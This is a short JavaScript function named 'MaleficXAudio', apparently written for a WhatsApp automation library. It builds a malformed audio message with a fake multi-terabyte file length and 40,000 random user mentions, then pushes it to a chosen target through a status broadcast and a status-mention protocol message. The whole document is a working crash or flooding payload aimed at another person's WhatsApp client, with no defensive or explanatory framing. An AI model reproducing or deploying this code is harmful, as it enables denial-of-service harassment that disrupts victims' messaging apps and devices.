async function MaleficXAudio(isTarget, mention = true) {
  const msg = await generateWAMessageFromContent(
    isTarget,
    {
      audioMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
        mimetype: "audio/mpeg",
        fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
        fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
        mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
        fileLength: "9999999999999",
        seconds: 24,
        ptt: false,
        contextInfo: {
          mentionedJid: Array.from({ length: 40000 }, () =>
            1${Math.floor(Math.random() * 500000)}@s.whatsapp.net
          )
        }
      }
    },
    {}
  );

  await sock.relayMessage("status@broadcast",  msg.message, {
      messageId: msg.key.id,
      statusJidList: [isTarget],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: isTarget },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    }
  );

  if (mention) {
    await sock.relayMessage(
      isTarget,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined
          }
        ]
      }
    );
  }
}
© KuzeXiter
